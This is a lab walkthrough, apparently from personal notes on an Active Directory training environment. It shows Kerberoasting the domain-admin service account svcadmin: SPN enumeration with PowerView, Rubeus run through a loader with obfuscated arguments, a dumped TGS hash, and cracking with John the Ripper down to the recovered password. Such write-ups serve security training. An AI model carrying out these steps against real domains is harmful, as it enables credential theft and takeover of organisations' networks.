# 🧢 Crack SQL Server's password with Kerberoasting

```
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see that The svcadmin, which is a domain administrator has a SPN set, we can kerberoast it&#x20;

* **SPN (Service Principal Name)**: An SPN is a unique identifier for a service instance. It is used in Kerberos authentication to associate a service instance with a service logon account. When a service account like `svcadmin` has an SPN set, it means this account is registered to run a particular service.
* **Kerberoasting**: This is an attack technique used in Windows environments where an attacker requests a Kerberos service ticket for a service account (which has an SPN set). The ticket is encrypted with the service account's password hash. The attacker can then extract this ticket and attempt to crack the password hash offline. If the password is weak or guessable, the attacker can obtain the service account's password, potentially leading to further compromise of the domain.

#### Steps Involved in Kerberoasting

1. **Identify Accounts with SPNs**: Use tools like `GetUserSPNs.py` from the Impacket suite, or PowerShell commands to list accounts with SPNs.
2. **Request Kerberos Ticket**: Use a tool like `Request-SPNTicket` in PowerShell or `GetUserSPNs.py` to request a service ticket for the identified account.
3. **Extract the Ticket**: Extract the service ticket from memory or the ticket cache.
4. **Crack the Ticket**: Use tools like `Hashcat` or `John the Ripper` to crack the password hash contained in the service ticket.

Let's start by using argsplit to encode "kerberoast" and launch this command ->

```
>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and if we go and see the hashes file ->

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*$D9CE8BB933C0A9FFEBE55E06E9BE9A68$006BB97D7609EB6FE50D72EF7490F576BFC5482E81A556C4B508D6554DB02315B961597F2DC88852477D2D0FAAD4D8610791276338FEBF6032B3A6BA67B215EC66F3468D4F9373606FA0AC2CF93F42A2C88EFEF83C558150C24F8408F28C75B397BDF5665A9B9C9814F0B1790914AE169F6AC1A62F09E9F8926BBDA0017F4429540667F6B5D09493BA3FAEE01DE0DC2E0C9E3156367F68E63AAE1F29C7CF3D5BACA3550AE27513B57BB086A48B5C2A801D78250CFDFCF2CA8D43063FF7D62D5325350BB885B67A9CDFB97979E6BA39D13400B28D1271397FE2F7020095B3A636CB908B81821C4FD6C447DFB8BD0471857B1C5DF068BCEDCA13CC33A241C1CAF54A6BD8B23F08D70C789CCF761CFBD2ED4F7413B72A86D3770D8CF2B706FF45487D10FBEA9D52709A1EEB4E1F07BFB1D0EC66F5663313488E39CEFF2F714F9C5021B89EF9CE53B05D92CB17FB77F59D7BAFEC73C22F20AA4FB1C042255AED77535C393EE74BE950554E35638E0BCFD04E5D1CA77BF27BC3AD8C8AE95927DD902635C1FFF4237761D66C5B869148E410AF1501AA248D72DDF47DC970BB529A3253D6A6F5A7E9FD7AA1AC221D84110A555731AE5ADD9A2F488C622B8340485D6D019623FC889F719E5026AFD769DBBB3B1B1EEDAD448958C5E125DD2311411A4F3057B79F7FAC76FA020AB1C8FADEC9F527E38D1B27C997821ED10BCD56C6992AD5458CF6C7A6E774701B499844F8004BE12FED4ECA22EAB4D208C420AB519E70D9209522C25B5841EF2FA411CD26C98B6C99736FA758DC23F0E0AA8F2E310405FA49E5CC23DF241E0545D823F01233E0EBE1EF5E06481B1054FF116FA4AB74E9ADAFBBAEDBBEDDBECC2716962B11D0C1A34442B93B1107A441017730F1588A1035A35E1047AD46751F183DADD499D7B80E7D017247B477E06E7A52D6B6D570094DD476221E21956CDBFFD7A06A86EEB36B9CFE856369D7776B76E5CACA5E687F355A2D79E6D2B73764DF850310BB8D30E32C63320EFC26D5B46504F066B017296A0090BC115D6DF44E10053C57F57605D9EB6D7B70F629AE2A3D36B0C92954C5AF6A60A3F77DFFB78954386749A8CDB6F80180CFDB33E7EFBD5421B5C6F9F22ACA6DAB9CD2F71691F44980D747F1A513C4F31977A8280114559BE72C56B1BA78BFC9CF675B9D6E4195D2BA976694AAAF2A52984FBD1D2AED1CD9AC6C3742C9503EA0AA3BEED62E0062C52FE2968E92FC387EC78852974556D7C3D59492BB4A6A64DB68888E5AA7C82D04C361F13B1504852AB99BE103D4F04098E25BB48E70A06DB2C6AB7EDA060411B156DF7DAC37697AA4A0A162895FCD6FC4477E905FBC4708382C529A68E77EE9DEFF6146D70AAA86C458C05FC6436571E680EADE23A43B5415FED8CDD446E15A4DF96D5AA580B9FF525F7D10756D8213A7FCE43F364372640BAF3BE87A74B2A698B0F8922B63477208209ACFC57F25D053A6FF343B81F1EAB65BD51732A3207C9EBC0B737A7FBFCC4E6C71C0BEAF63683D98AB174EA8A731AF266E75A2F0496236F358E8CCC785B83B2D79B52A1AE814C33E5DCEFBF17DC607CC79C3EFC46609FFDF2F5547BA22EA8C0157E40502864AE2F100049EF74CB5ABFFE348C3E49F060386455B9DCD795B1DB39926227FE8CC56CFF91119
```

but before launching john the ripper, we need to remove the **1433** part in the txt file ->

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then we can launch john:

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>ThisisBlasphemyThisisMadness</p></figcaption></figure>
